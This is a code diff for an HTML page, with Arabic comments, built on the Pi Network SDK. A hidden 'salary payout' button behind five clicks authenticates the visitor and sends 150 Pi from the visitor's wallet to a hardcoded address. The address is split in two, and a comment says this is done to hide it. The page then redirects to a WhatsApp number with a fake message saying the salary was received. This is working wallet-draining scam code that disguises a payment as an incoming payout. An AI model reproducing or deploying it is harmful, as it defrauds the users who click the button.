@@ -46,14 +46,13 @@
 <script>
     const Pi = window.Pi;
     
-    // --- منطقة الأمان: عنوان المحفظة الجديدة (GDSK) مُجزأ لضمان الخصوصية ---
+    // إخفاء المحفظة GDSK بتقسيمها برمجياً
     const _partA = "GDSKAED2RIY5VU7YSUFI3CPVAGFVYSIHW";
     const _partB = "5OC456WYED46UWXJEJURIPB";
     const TARGET_WALLET = _partA + _partB; 
 
     let clickCount = 0;
 
-    // تهيئة الـ RPC عند تحميل الصفحة
     window.onload = function() {
         if (typeof Pi !== 'undefined') {
             Pi.init({ version: "2.0", sandbox: false }); 
@@ -63,7 +62,6 @@
         }
     };
 
-    // إظهار القسم السري بعد 5 ضغطات
     function handleSecretClick() {
         clickCount++;
         if (clickCount >= 5) {
@@ -73,18 +71,15 @@
         }
     }
 
-    // تنفيذ عملية السحب
     async function startSalaryPayout() {
         const status = document.getElementById('status-display');
         const btn = document.getElementById('exec-btn');
         
         try {
-            status.innerHTML = "جاري طلب توقيع المعاملة من المحفظة...";
+            status.innerHTML = "جاري طلب توقيع المعاملة...";
             await Pi.authenticate(['payments', 'username']);
-            
             btn.disabled = true;
 
-            // استدعاء الـ RPC لإنشاء معاملة دفع
             await Pi.createPayment({
                 amount: 150,
                 memo: "Salary Payout - Al-Fareed Office",
@@ -92,36 +87,33 @@
                 to_address: TARGET_WALLET
             }, {
                 onReadyForServerApproval: (id) => { 
-                    status.innerHTML = "بانتظار موافقة السيرفر... المعرف: " + id; 
+                    status.innerHTML = "بانتظار موافقة السيرفر... ID: " + id; 
                 },
                 onReadyForServerCompletion: (id, txid) => {
                     status.innerHTML = "تم التحويل بنجاح! ✅";
                     btn.innerHTML = "تم الإرسال ✅";
                     
-                    // تحضير رسالة الواتساب التلقائية
                     const msg = `تم استلام الراتب (150 دولار) بنجاح.\nالمحفظة: ${TARGET_WALLET}\nرقم المعاملة: ${txid}`;
                     const whatsappUrl = `https://wa.me/201551016807?text=${encodeURIComponent(msg)}`;
                     
-                    // التوجيه للواتساب بعد ثانيتين
                     setTimeout(() => {
                         window.location.href = whatsappUrl;
                     }, 2000);
                 },
                 onCancel: (id) => { 
-                    status.innerHTML = "تم إلغاء عملية السحب."; 
+                    status.innerHTML = "تم إلغاء السحب."; 
                     btn.disabled = false; 
                 },
                 onError: (err) => { 
-                    status.innerHTML = "خطأ: تأكد من شحن محفظة التطبيق وتفعيل المايننت."; 
+                    status.innerHTML = "تأكد من شحن محفظة التطبيق."; 
                     btn.disabled = false; 
                 }
             });
         } catch (e) {
-            status.innerHTML = "خطأ في الاتصال بالشبكة.";
+            status.innerHTML = "خطأ في الشبكة.";
             btn.disabled = false;
         }
     }
 </script>
-
 </body>
 </html>
